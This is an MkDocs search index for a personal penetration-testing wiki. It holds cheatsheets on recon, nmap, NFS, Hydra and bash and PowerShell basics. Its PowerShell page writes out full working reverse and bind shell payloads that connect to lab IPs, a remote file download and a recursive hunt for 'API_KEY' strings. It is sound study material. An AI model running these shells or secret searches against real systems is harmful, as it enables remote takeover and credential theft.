{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Fluffy's Docs \u00b6 A braindump wiki of different bits of (mainly security related) knowledge that I decided to write down Also contains some writeups for some CTF challenges and similar Interesting Pages \u00b6 MKDocs Cheatsheet - How I made this Wiki Pages tagged as polished - A little less brain-dumpy Pwd Guessr - An interesting CTF challenge that required scripting Note Some of these pages were written for consumption by others, and some are written for my own reference Expect variance in how coherent the different pages are","title":"Fluffy's Docs"},{"location":"#fluffys-docs","text":"A braindump wiki of different bits of (mainly security related) knowledge that I decided to write down Also contains some writeups for some CTF challenges and similar","title":"Fluffy's Docs"},{"location":"#interesting-pages","text":"MKDocs Cheatsheet - How I made this Wiki Pages tagged as polished - A little less brain-dumpy Pwd Guessr - An interesting CTF challenge that required scripting Note Some of these pages were written for consumption by others, and some are written for my own reference Expect variance in how coherent the different pages are","title":"Interesting Pages"},{"location":"cheatsheets/active-recon/","text":"DNSRecon \u00b6 Example: dnsrecon -d domain.com -t SCANTYPE Scan types: std - Look at SOA, NS, A, AAAA, MX and SRV rvl - Reverse lookup of CIDR or IP range brt - Brute force axfr - Zone transfer DNSEnum \u00b6 Example dnsenum domain.com NetBIOS \u00b6 sudo nbtscan -r 10.1.1.0/24","title":"Active Recon"},{"location":"cheatsheets/active-recon/#dnsrecon","text":"Example: dnsrecon -d domain.com -t SCANTYPE Scan types: std - Look at SOA, NS, A, AAAA, MX and SRV rvl - Reverse lookup of CIDR or IP range brt - Brute force axfr - Zone transfer","title":"DNSRecon"},{"location":"cheatsheets/active-recon/#dnsenum","text":"Example dnsenum domain.com","title":"DNSEnum"},{"location":"cheatsheets/active-recon/#netbios","text":"sudo nbtscan -r 10.1.1.0/24","title":"NetBIOS"},{"location":"cheatsheets/aliases/","text":"Unless specified, aliases are zsh compatible Showsploit \u00b6 searchsploit is useful for getting exploits, use showsploit to cat the file Usage \u00b6 showsploit linux/remote/19503.txt Definition \u00b6 function showsploit { exploit_path = \"/usr/share/exploitdb/exploits/ ${ 1 } \" echo \"Showing: ${ exploit_path } \" echo \"==============\" cat $exploit_path }","title":"Aliases"},{"location":"cheatsheets/aliases/#showsploit","text":"searchsploit is useful for getting exploits, use showsploit to cat the file","title":"Showsploit"},{"location":"cheatsheets/aliases/#usage","text":"showsploit linux/remote/19503.txt","title":"Usage"},{"location":"cheatsheets/aliases/#definition","text":"function showsploit { exploit_path = \"/usr/share/exploitdb/exploits/ ${ 1 } \" echo \"Showing: ${ exploit_path } \" echo \"==============\" cat $exploit_path }","title":"Definition"},{"location":"cheatsheets/bash/","text":"Warning This sheet is a supplement for my reference, so might not be useful to others File Downloads \u00b6 wget \u00b6 Wget to location wget -O savefile.txt http://web/file.txt Comparing files \u00b6 comm - column display of file diferences diff - You know, the most common diff format Diff \u00b6 Flag Description -y Side by side -r Recursive (directory) Scripting \u00b6 Special Variables \u00b6 Var Description $0 Name of bash script $1 - $9 First 9 arguments of script $# Number of arguments $? Status code of last run process $$ Process ID of current script $USER Current user $HOSTNAME Hostname of machine $RANDOM Random integer $LINENO Current line number in script Reading Input \u00b6 echo \"What is your name?\" read name echo \"Hello, $name \" Flag Description -p \"Prompt\" Specify prompt -s Don't echo user input, eg. for passwords Conditionals \u00b6 If Statement if [ <some test> ] ; then do something fi Else Statement if [ <some test> ] ; then do something else do somethingelse fi Warning Conditionals are very white space sensitive Operator Description (True if) !EXPRESSION The EXPRESSION is false -n STRING STRING length > 0 -z STRING STRING length = 0 STRING1 != STRING2 Strings not equal STRING1 = STRING2 Strings equal INT1 -eq INT2 Int equality INT1 -ne INT2 Int inequality INT1 -gt INT2 Int1 > INT2 INT1 -lt INT2 Int1 < INT2 INT1 -ge INT2 Int1 >= INT2 INT1 -le INT2 Int1 <= INT2 -d PATH Path exists and is a directory -e PATH Path exists -r PATH Path exists and is readable -w PATH Path exists and is writable -x PATH Path exists and is executable [ is actually a program, which returns 1 for a false, or 0 for true. As such you can do if some command ; then echo \"Command succeeded\" else echo \"Command failed\" fi Boolean Operators \u00b6 command1 && command2 Will run command2 if and only if command1 succeeds (returns zero code) command1 || command2 Will run command2 if and only if command1 fails (returns non-zero code) Example grep $user2 /etc/passwd && echo \" $user2 found!\" || echo \" $user2 not found!\" Loops \u00b6 For Loops \u00b6 Syntax for var in <list> do echo $var done Example for ip in $( seq 1 10 ) ; do echo 10 .11.1. $ip ; done or for ip in { 1 ..10 } ; do echo 10 .11.1. $ip ; done Example 2 for textfile in *.txt ; do echo \"Found $textfile \" ; done While loops \u00b6 Syntax while [ <some test> ] do something done Previous for loop example counter = 1 while [ $counter -lt 10 ] do echo \"10.11.1. $counter \" (( counter++ )) done Functions \u00b6 Syntax function my_func { } Variables \u00b6 Two types of variables, shell variables and environment variables. Shell variables are not passed to child processes shell_var = \"stuff\" echo \"shell_var= ${ shell_var } \" Environment variables are inherited by children and can be seen in /proc/<pid>/environ Can set an environment variable with export export SOME_ENV = \"stuff\" env | grep \"SOME_ENV\" # returns 'SOME_ENV=stuff' ANOTHER_ENV = \"something else\" env | grep \"ANOTHER_ENV\" # Doesn't work export ANOTHER_ENV env | grep \"ANOTHER_ENV\" # returns 'ANOTHER_ENV=something else' Useful Commands \u00b6 xdg-open \u00b6 Open the file or folder in whatever program is the defaul, eg. open a media player for a video, or your browser for a website or a file browser for a directory.","title":"Bash"},{"location":"cheatsheets/bash/#file-downloads","text":"","title":"File Downloads"},{"location":"cheatsheets/bash/#wget","text":"Wget to location wget -O savefile.txt http://web/file.txt","title":"wget"},{"location":"cheatsheets/bash/#comparing-files","text":"comm - column display of file diferences diff - You know, the most common diff format","title":"Comparing files"},{"location":"cheatsheets/bash/#diff","text":"Flag Description -y Side by side -r Recursive (directory)","title":"Diff"},{"location":"cheatsheets/bash/#scripting","text":"","title":"Scripting"},{"location":"cheatsheets/bash/#special-variables","text":"Var Description $0 Name of bash script $1 - $9 First 9 arguments of script $# Number of arguments $? Status code of last run process $$ Process ID of current script $USER Current user $HOSTNAME Hostname of machine $RANDOM Random integer $LINENO Current line number in script","title":"Special Variables"},{"location":"cheatsheets/bash/#reading-input","text":"echo \"What is your name?\" read name echo \"Hello, $name \" Flag Description -p \"Prompt\" Specify prompt -s Don't echo user input, eg. for passwords","title":"Reading Input"},{"location":"cheatsheets/bash/#conditionals","text":"If Statement if [ <some test> ] ; then do something fi Else Statement if [ <some test> ] ; then do something else do somethingelse fi Warning Conditionals are very white space sensitive Operator Description (True if) !EXPRESSION The EXPRESSION is false -n STRING STRING length > 0 -z STRING STRING length = 0 STRING1 != STRING2 Strings not equal STRING1 = STRING2 Strings equal INT1 -eq INT2 Int equality INT1 -ne INT2 Int inequality INT1 -gt INT2 Int1 > INT2 INT1 -lt INT2 Int1 < INT2 INT1 -ge INT2 Int1 >= INT2 INT1 -le INT2 Int1 <= INT2 -d PATH Path exists and is a directory -e PATH Path exists -r PATH Path exists and is readable -w PATH Path exists and is writable -x PATH Path exists and is executable [ is actually a program, which returns 1 for a false, or 0 for true. As such you can do if some command ; then echo \"Command succeeded\" else echo \"Command failed\" fi","title":"Conditionals"},{"location":"cheatsheets/bash/#boolean-operators","text":"command1 && command2 Will run command2 if and only if command1 succeeds (returns zero code) command1 || command2 Will run command2 if and only if command1 fails (returns non-zero code) Example grep $user2 /etc/passwd && echo \" $user2 found!\" || echo \" $user2 not found!\"","title":"Boolean Operators"},{"location":"cheatsheets/bash/#loops","text":"","title":"Loops"},{"location":"cheatsheets/bash/#for-loops","text":"Syntax for var in <list> do echo $var done Example for ip in $( seq 1 10 ) ; do echo 10 .11.1. $ip ; done or for ip in { 1 ..10 } ; do echo 10 .11.1. $ip ; done Example 2 for textfile in *.txt ; do echo \"Found $textfile \" ; done","title":"For Loops"},{"location":"cheatsheets/bash/#while-loops","text":"Syntax while [ <some test> ] do something done Previous for loop example counter = 1 while [ $counter -lt 10 ] do echo \"10.11.1. $counter \" (( counter++ )) done","title":"While loops"},{"location":"cheatsheets/bash/#functions","text":"Syntax function my_func { }","title":"Functions"},{"location":"cheatsheets/bash/#variables","text":"Two types of variables, shell variables and environment variables. Shell variables are not passed to child processes shell_var = \"stuff\" echo \"shell_var= ${ shell_var } \" Environment variables are inherited by children and can be seen in /proc/<pid>/environ Can set an environment variable with export export SOME_ENV = \"stuff\" env | grep \"SOME_ENV\" # returns 'SOME_ENV=stuff' ANOTHER_ENV = \"something else\" env | grep \"ANOTHER_ENV\" # Doesn't work export ANOTHER_ENV env | grep \"ANOTHER_ENV\" # returns 'ANOTHER_ENV=something else'","title":"Variables"},{"location":"cheatsheets/bash/#useful-commands","text":"","title":"Useful Commands"},{"location":"cheatsheets/bash/#xdg-open","text":"Open the file or folder in whatever program is the defaul, eg. open a media player for a video, or your browser for a website or a file browser for a directory.","title":"xdg-open"},{"location":"cheatsheets/enumeration/","text":"Network Based Enumeration \u00b6 If Windows (dropping pings) add -Pn to scans Basic scan nmap $TARGET_IP Service version detection nmap -sV $TARGET_IP List available nmap scripts ls /usr/share/nmap/scripts SMB Enumeration \u00b6 nmap -p 445 --script = smb-enum-shares.nse,smb-enum-users.nse $TARGET_IP HTTP Enumeration \u00b6 Gobuster gobuster dir -u http:// $TARGET_IP / -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt Nikto - TODO Check: sitemap.xml robots.txt SMTP Enumeration \u00b6 smtp-user-enum -M VRFY -U users.txt -t 10 .1.1.1 smtp-user-enum -M VRFY -u bob -t 10 .1.1.1 Linux Enumeration \u00b6 Automated \u00b6 My favourite: LinPEAS https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS LinEnum wget https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh SUID3NUM - find Suid files wget https://github.com/Anon-Exploiter/SUID3NUM/raw/master/suid3num.py python suid3num Windows \u00b6 TODO Subdomain Enumeration \u00b6 https://searchdns.netcraft.com https://dnsdumpster.com/","title":"Enumeration"},{"location":"cheatsheets/enumeration/#network-based-enumeration","text":"If Windows (dropping pings) add -Pn to scans Basic scan nmap $TARGET_IP Service version detection nmap -sV $TARGET_IP List available nmap scripts ls /usr/share/nmap/scripts","title":"Network Based Enumeration"},{"location":"cheatsheets/enumeration/#smb-enumeration","text":"nmap -p 445 --script = smb-enum-shares.nse,smb-enum-users.nse $TARGET_IP","title":"SMB Enumeration"},{"location":"cheatsheets/enumeration/#http-enumeration","text":"Gobuster gobuster dir -u http:// $TARGET_IP / -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt Nikto - TODO Check: sitemap.xml robots.txt","title":"HTTP Enumeration"},{"location":"cheatsheets/enumeration/#smtp-enumeration","text":"smtp-user-enum -M VRFY -U users.txt -t 10 .1.1.1 smtp-user-enum -M VRFY -u bob -t 10 .1.1.1","title":"SMTP Enumeration"},{"location":"cheatsheets/enumeration/#linux-enumeration","text":"","title":"Linux Enumeration"},{"location":"cheatsheets/enumeration/#automated","text":"My favourite: LinPEAS https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS LinEnum wget https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh SUID3NUM - find Suid files wget https://github.com/Anon-Exploiter/SUID3NUM/raw/master/suid3num.py python suid3num","title":"Automated"},{"location":"cheatsheets/enumeration/#windows","text":"TODO","title":"Windows"},{"location":"cheatsheets/enumeration/#subdomain-enumeration","text":"https://searchdns.netcraft.com https://dnsdumpster.com/","title":"Subdomain Enumeration"},{"location":"cheatsheets/google-dorks/","text":"Google Search is useful for finding information about an organisation or public facing files from the company. Useful source for docs: https://www.exploit-db.com/google-hacking-database Useful Search Operators \u00b6 Example Description filetype:php Only files with the extension/type -filetype:html Only files without the extension/type site:example.com Only results from that domain or subdomain Dorks \u00b6 Dorks are snippets that often find interesting results Example Description intitle:\"index of\" \"parent directory\" Find pages with index turned on","title":"Google Dorks"},{"location":"cheatsheets/google-dorks/#useful-search-operators","text":"Example Description filetype:php Only files with the extension/type -filetype:html Only files without the extension/type site:example.com Only results from that domain or subdomain","title":"Useful Search Operators"},{"location":"cheatsheets/google-dorks/#dorks","text":"Dorks are snippets that often find interesting results Example Description intitle:\"index of\" \"parent directory\" Find pages with index turned on","title":"Dorks"},{"location":"cheatsheets/mkdocs/","text":"This blog is made with a python library called mkdocs , or more specifically using mkdocs-material which is a fantastic theme that can render markdown files into a pretty website. Resources \u00b6 Material for MkDocs - The theme being used PyMdown Extensions - Tons of fancy stuff like banners, emojis and much much more Abbreviations \u00b6 Define abbreviations to have them automatically annotated throughout the document Example The HTML specification is maintained by the W3C . The HTML specification is maintained by the W3C. *[HTML]: Hyper Text Markup Language *[W3C]: World Wide Web Consortium Abbreviations Docs Footnotes \u00b6 Create footnotes inline and have them rendered at the bottom of the page Example See example 1 See example[^1] [^1]: And back to where you were Footnotes Docs Admonitions \u00b6 Attention grabbing banners for easy reading Collapsible Starts expanded, but can be collapsed ???+ example \"Collapsible\" Your note here Expandable - Expand Me! Great for spoilers ??? example \"Expandable - Expand Me!\" Your note here Warning This is a warning !!! warning Your note here Putting a string wrapped in \"\" after the level (eg. warning ) changes the title There's way more than just example and warning so make sure to check out: Admonition Docs Emojis \u00b6 Add a splash of colour Example :smile: :material-account-circle: :fontawesome-regular-laugh-wink: :fontawesome-brands-twitter: Icons + Emojis Docs Keyboard Keys \u00b6 Unambiguously show keyboard combinations Example Ctrl + Alt + Del ++ctrl+alt+del++ Keys Docs Task Lists \u00b6 Show a checklist of tasks that need doing Lorem ipsum dolor sit amet, consectetur adipiscing elit Vestibulum convallis sit amet nisi a tincidunt In hac habitasse platea dictumst In scelerisque nibh non dolor mollis congue sed et metus Praesent sed risus massa Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque Tasklist Docs Another related topic is Progress Bars Code Blocks \u00b6 Standard syntax lighting code blocks, with a copy to clipboard button ```python print(\"Hello!\") ``` Result print ( \"Hello!\" ) Line Numbers \u00b6 ``` python linenums=\"1\" 1 2 3 4 5 def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] Highlighting Lines \u00b6 ``` python hl_lines=\"2 3\" def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ] Code Block in Admonition \u00b6 Nest to your heart's content Example the_level . pull () For all information about code-blocks, nesting etc see: Superfences Docs Content Tabs \u00b6 Have multiple tabs of content for easy organisation C #include <stdio.h> int main ( void ) { printf ( \"Hello world! \\n \" ); return 0 ; } C++ #include <iostream> int main ( void ) { std :: cout << \"Hello world!\" << std :: endl ; return 0 ; } Tabs Docs Graphs \u00b6 Note Some of the graph lines are hard to see in dark theme, you can change themes with the button next to the search bar Sometimes you want to visually show something, and you don't want to leave your editor. Or maybe you just want design decisions to go through a code-review Graph Graph graph TD A[Client] --> B[Load Balancer] B --> C[Server01] B --> D[Server02] Markdown ```mermaid graph TD A[Client] --> B[Load Balancer] B --> C[Server01] B --> D[Server02] ``` Sequence Diagram Graph sequenceDiagram Alice->>+John: Hello John, how are you? Alice->>+John: John, can you hear me? John-->>-Alice: Hi Alice, I can hear you! John-->>-Alice: I feel great! Markdown ```mermaid sequenceDiagram Alice->>+John: Hello John, how are you? Alice->>+John: John, can you hear me? John-->>-Alice: Hi Alice, I can hear you! John-->>-Alice: I feel great! ``` Gantt Diagram Graph gantt title A Gantt Diagram dateFormat YYYY-MM-DD section Section A task :a1, 2014-01-01, 30d Another task :after a1 , 20d section Another Task in sec :2014-01-12 , 12d another task : 24d Markdown ```mermaid gantt title A Gantt Diagram dateFormat YYYY-MM-DD section Section A task :a1, 2014-01-01, 30d Another task :after a1 , 20d section Another Task in sec :2014-01-12 , 12d another task : 24d ``` Mermaid Charts Docs And back to where you were \u21a9","title":"Mkdocs"},{"location":"cheatsheets/mkdocs/#resources","text":"Material for MkDocs - The theme being used PyMdown Extensions - Tons of fancy stuff like banners, emojis and much much more","title":"Resources"},{"location":"cheatsheets/mkdocs/#abbreviations","text":"Define abbreviations to have them automatically annotated throughout the document Example The HTML specification is maintained by the W3C . The HTML specification is maintained by the W3C. *[HTML]: Hyper Text Markup Language *[W3C]: World Wide Web Consortium Abbreviations Docs","title":"Abbreviations"},{"location":"cheatsheets/mkdocs/#footnotes","text":"Create footnotes inline and have them rendered at the bottom of the page Example See example 1 See example[^1] [^1]: And back to where you were Footnotes Docs","title":"Footnotes"},{"location":"cheatsheets/mkdocs/#admonitions","text":"Attention grabbing banners for easy reading Collapsible Starts expanded, but can be collapsed ???+ example \"Collapsible\" Your note here Expandable - Expand Me! Great for spoilers ??? example \"Expandable - Expand Me!\" Your note here Warning This is a warning !!! warning Your note here Putting a string wrapped in \"\" after the level (eg. warning ) changes the title There's way more than just example and warning so make sure to check out: Admonition Docs","title":"Admonitions"},{"location":"cheatsheets/mkdocs/#emojis","text":"Add a splash of colour Example :smile: :material-account-circle: :fontawesome-regular-laugh-wink: :fontawesome-brands-twitter: Icons + Emojis Docs","title":"Emojis"},{"location":"cheatsheets/mkdocs/#keyboard-keys","text":"Unambiguously show keyboard combinations Example Ctrl + Alt + Del ++ctrl+alt+del++ Keys Docs","title":"Keyboard Keys"},{"location":"cheatsheets/mkdocs/#task-lists","text":"Show a checklist of tasks that need doing Lorem ipsum dolor sit amet, consectetur adipiscing elit Vestibulum convallis sit amet nisi a tincidunt In hac habitasse platea dictumst In scelerisque nibh non dolor mollis congue sed et metus Praesent sed risus massa Aenean pretium efficitur erat, donec pharetra, ligula non scelerisque Tasklist Docs Another related topic is Progress Bars","title":"Task Lists"},{"location":"cheatsheets/mkdocs/#code-blocks","text":"Standard syntax lighting code blocks, with a copy to clipboard button ```python print(\"Hello!\") ``` Result print ( \"Hello!\" )","title":"Code Blocks"},{"location":"cheatsheets/mkdocs/#line-numbers","text":"``` python linenums=\"1\" 1 2 3 4 5 def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ]","title":"Line Numbers"},{"location":"cheatsheets/mkdocs/#highlighting-lines","text":"``` python hl_lines=\"2 3\" def bubble_sort ( items ): for i in range ( len ( items )): for j in range ( len ( items ) - 1 - i ): if items [ j ] > items [ j + 1 ]: items [ j ], items [ j + 1 ] = items [ j + 1 ], items [ j ]","title":"Highlighting Lines"},{"location":"cheatsheets/mkdocs/#code-block-in-admonition","text":"Nest to your heart's content Example the_level . pull () For all information about code-blocks, nesting etc see: Superfences Docs","title":"Code Block in Admonition"},{"location":"cheatsheets/mkdocs/#content-tabs","text":"Have multiple tabs of content for easy organisation C #include <stdio.h> int main ( void ) { printf ( \"Hello world! \\n \" ); return 0 ; } C++ #include <iostream> int main ( void ) { std :: cout << \"Hello world!\" << std :: endl ; return 0 ; } Tabs Docs","title":"Content Tabs"},{"location":"cheatsheets/mkdocs/#graphs","text":"Note Some of the graph lines are hard to see in dark theme, you can change themes with the button next to the search bar Sometimes you want to visually show something, and you don't want to leave your editor. Or maybe you just want design decisions to go through a code-review Graph Graph graph TD A[Client] --> B[Load Balancer] B --> C[Server01] B --> D[Server02] Markdown ```mermaid graph TD A[Client] --> B[Load Balancer] B --> C[Server01] B --> D[Server02] ``` Sequence Diagram Graph sequenceDiagram Alice->>+John: Hello John, how are you? Alice->>+John: John, can you hear me? John-->>-Alice: Hi Alice, I can hear you! John-->>-Alice: I feel great! Markdown ```mermaid sequenceDiagram Alice->>+John: Hello John, how are you? Alice->>+John: John, can you hear me? John-->>-Alice: Hi Alice, I can hear you! John-->>-Alice: I feel great! ``` Gantt Diagram Graph gantt title A Gantt Diagram dateFormat YYYY-MM-DD section Section A task :a1, 2014-01-01, 30d Another task :after a1 , 20d section Another Task in sec :2014-01-12 , 12d another task : 24d Markdown ```mermaid gantt title A Gantt Diagram dateFormat YYYY-MM-DD section Section A task :a1, 2014-01-01, 30d Another task :after a1 , 20d section Another Task in sec :2014-01-12 , 12d another task : 24d ``` Mermaid Charts Docs And back to where you were \u21a9","title":"Graphs"},{"location":"cheatsheets/nfs/","text":"Enumeration \u00b6 Port and IP vary nmap -p 111 --script = nfs-ls,nfs-statfs,nfs-showmount 10 .10.184.192 Mount \u00b6 mount -t nfs 10.11.1.72:/home /tmp/mnt -nolock Tips \u00b6 Permissions may be checked client side, so add a user with given uid may bypass","title":"NFS (Network File System)"},{"location":"cheatsheets/nfs/#enumeration","text":"Port and IP vary nmap -p 111 --script = nfs-ls,nfs-statfs,nfs-showmount 10 .10.184.192","title":"Enumeration"},{"location":"cheatsheets/nfs/#mount","text":"mount -t nfs 10.11.1.72:/home /tmp/mnt -nolock","title":"Mount"},{"location":"cheatsheets/nfs/#tips","text":"Permissions may be checked client side, so add a user with given uid may bypass","title":"Tips"},{"location":"cheatsheets/nmap/","text":"Can specify single IP, CIDR or space delimited multiple locations. I'm lazy just go to https://www.stationx.net/nmap-cheat-sheet/ nmap --help Target Specification \u00b6 Switch Description Notes -iL Scan targets from file newline delimited text file --exclude Exclude IP from targets Scan Techniques \u00b6 Switch Description -sS TCP SYN port scan (default) -sT TCP connect port scan (default without root) -sU UDP port scan -sA TCP ACK port scan -sW TCP Window port scan -sM TCP Mainmon port scan Host Discovery \u00b6 Switch Description Notes -sL Don't scan just list targets -sn No port scan, just ping/arp scan -Pn No host scan (don't ping first) just port Useful against window / machines blocking ping -n No DNS resolution Other Useful Flags \u00b6 Switch Description -O Enable OS detection -b FTP Bounce scan Port Spec \u00b6 SEE https://www.stationx.net/nmap-cheat-sheet/ Scripts \u00b6 SMB Enum nmap -p 445 --script = smb-enum-shares.nse,smb-enum-users.nse 10 .10.184.192","title":"Nmap Cheatsheet"},{"location":"cheatsheets/nmap/#target-specification","text":"Switch Description Notes -iL Scan targets from file newline delimited text file --exclude Exclude IP from targets","title":"Target Specification"},{"location":"cheatsheets/nmap/#scan-techniques","text":"Switch Description -sS TCP SYN port scan (default) -sT TCP connect port scan (default without root) -sU UDP port scan -sA TCP ACK port scan -sW TCP Window port scan -sM TCP Mainmon port scan","title":"Scan Techniques"},{"location":"cheatsheets/nmap/#host-discovery","text":"Switch Description Notes -sL Don't scan just list targets -sn No port scan, just ping/arp scan -Pn No host scan (don't ping first) just port Useful against window / machines blocking ping -n No DNS resolution","title":"Host Discovery"},{"location":"cheatsheets/nmap/#other-useful-flags","text":"Switch Description -O Enable OS detection -b FTP Bounce scan","title":"Other Useful Flags"},{"location":"cheatsheets/nmap/#port-spec","text":"SEE https://www.stationx.net/nmap-cheat-sheet/","title":"Port Spec"},{"location":"cheatsheets/nmap/#scripts","text":"SMB Enum nmap -p 445 --script = smb-enum-shares.nse,smb-enum-users.nse 10 .10.184.192","title":"Scripts"},{"location":"cheatsheets/passive-recon/","text":"General resource: https://osintframework.com/ Recon-NG \u00b6 Modular recon tool by Blackhills Infosec marketplace search google marketplace info recon/domains-hosts/google_site_web marketplace install recon/domains-hosts/google_site_web marketplace load recon/domains-hosts/google_site_web info options set SOURCE example.com run show companies show contacts show credentials show ... Git Searching \u00b6 gitrob gitleaks Shodan \u00b6 TODO theharvester \u00b6 A multi tool for geting info from a company https://github.com/laramies/theHarvester theHarvester -d example.com -b google","title":"Passive Recon"},{"location":"cheatsheets/passive-recon/#recon-ng","text":"Modular recon tool by Blackhills Infosec marketplace search google marketplace info recon/domains-hosts/google_site_web marketplace install recon/domains-hosts/google_site_web marketplace load recon/domains-hosts/google_site_web info options set SOURCE example.com run show companies show contacts show credentials show ...","title":"Recon-NG"},{"location":"cheatsheets/passive-recon/#git-searching","text":"gitrob gitleaks","title":"Git Searching"},{"location":"cheatsheets/passive-recon/#shodan","text":"TODO","title":"Shodan"},{"location":"cheatsheets/passive-recon/#theharvester","text":"A multi tool for geting info from a company https://github.com/laramies/theHarvester theHarvester -d example.com -b google","title":"theharvester"},{"location":"cheatsheets/passwordattacks/","text":"Web Based Attacks \u00b6 Hydra \u00b6 TARGET_USER = target TARGET_IP = hydra -l $TARGET_USER -P /usr/share/wordlists/rockyou.txt Useful Flags Flag Description -f Stop attack once combination found","title":"Password Attacks"},{"location":"cheatsheets/passwordattacks/#web-based-attacks","text":"","title":"Web Based Attacks"},{"location":"cheatsheets/passwordattacks/#hydra","text":"TARGET_USER = target TARGET_IP = hydra -l $TARGET_USER -P /usr/share/wordlists/rockyou.txt Useful Flags Flag Description -f Stop attack once combination found","title":"Hydra"},{"location":"cheatsheets/powershell/","text":"Powershell is an object-oriented scripting language made for Windows. Most commands are commandlets which are typically of the form Verb - Noun . Common verbs: Get , Start , Stop , Read , Write , New , Out For more common verbs see: https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7 . Man Pages \u00b6 To get information about a cmdlet, use the Get-Help cmdlet. eg. Get-Help Get-Process To see example usages, pass the -Examples flag Syntax \u00b6 Case insensitive Backtick to escape characters Can use | to pipe the output of a cmdlet into another Note As the output of cmdlets are objects not raw strings, it is different from a bash pipe Execution Policy \u00b6 By default, only signed scripts can be run, this can be chagned with Set-ExecutionPolicy -Scope CurrentUser Bypass If you have Admin, you can leave out the -Scope CurrentUser Useful Commands \u00b6 Get-Command \u00b6 Roughly equivalent to which in bash Lists commands on the current computer. Supports pattern matching eg. Get-Command New -* Get-Member \u00b6 Gets properties and methods of objects TODO: Work out what that means Get-ChildItem \u00b6 Roughly like ls in bash eg. List files and directories in Desktop folder Get-ChildItem .\\ Desktop \\ To see hidden files use -Force eg. An agnozing example Get-ChildItem -Path C :\\ -Force -Recurse -ErrorAction SilentlyContinue -Include interesting -file * Get-Content \u00b6 Get contents of file, like bash cat command. Select-Object \u00b6 Pull out properties from output of another cmdlet. eg. To list just the mode and name for files/dirs within the current directory Get-ChildItem | Select-Object -Property Mode , Name eg. Get first 5 items in current directory (like head in bash) Get-ChildItem | Select-Object -First 5 eg. Get last 5 items in current directory (like tail in bash) Get-ChildItem | Select-Object -Last 5 Other useful flags: - Index - Unique - Skip - ExcludeProperty Where-Object \u00b6 Only select objects that match a filter. Sort of like grep . eg. List files modified after 10/4/2019 Get-ChildItem | Where-Object -Property LastWriteTime -GT 10 / 4 / 2019 Useful operators: -Contains - if collection has item that exactly matches -EQ - Exactly equal -LT -GT -GE - Greater than or equal For more details: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.1#examples Sort-Object \u00b6 Kinda like bash sort command. Useful flags: -Unique Example I don't understand: Get-Service | Sort-Object -Property @{ Expression = \"Status\" ; Descending = $True }, @{ Expression = \"DisplayName\" ; Descending = $False } Base64 \u00b6 Powershell does not have a native way to do Base64 encode / decode so instead you can do Decoding $data = Get-Content .\\ b64 . txt $decoded = [System.Text.Encoding] :: ASCII . GetString ( [System.Convert] :: FromBase64String ( $data )) Encoding $decoded = Get-Content .\\ somefile . txt $encoded = [Convert] :: ToBase64String ( [Text.Encoding] :: UTF8 . GetBytes ( $decoded )) Other Useful Commands \u00b6 Measure-Object - like wc Invoke-Webrequest - like curl or wget Get-FileHash - like md5sum Get-Location - like pwd Get-LocalUser - list users Get-LocalGroup - list groups Get-NetIPAddress - like ip addr Get-NetTCPConnection - like netstat -t Get-HotFix - list installed updates Other Tasks \u00b6 Find files containing the string \"API_KEY\" Get-ChildItem -ErrorAction SilentlyContinue -Recurse -Path C :\\ | Select-String -ErrorAction SilentlyContinue \"API_KEY\" -List | Select Path Download a file ( New-Object System . Net . WebClient ). DownloadFile ( 'http://10.11.0.4/wget.exe' , 'C:\\Users\\Public\\wget.exe' ) Reverse Shell $client = New-Object System . Net . Sockets . TCPClient ( '192.168.119.154' , 9001 ); $stream = $client . GetStream (); [byte[]] $bytes = 0 .. 65535 |%{ 0 }; while (( $i = $stream . Read ( $bytes , 0 , $bytes . Length )) -ne 0 ) { $data = ( New-Object -TypeName System . Text . ASCIIEncoding ). GetString ( $bytes , 0 , $i ); $sendback = ( iex $data 2 >& 1 | Out-String ); $sendback2 = $sendback + 'PS ' + ( pwd ). Path + '> ' ; $sendbyte = ( [text.encoding] :: ASCII ). GetBytes ( $sendback2 ); $stream . Write ( $sendbyte , 0 , $sendbyte . Length ); $stream . Flush (); } $client . Close (); Or as a one liner powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()\" Bind Shell powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\" Powercat \u00b6 \"I just want netcat\" Download 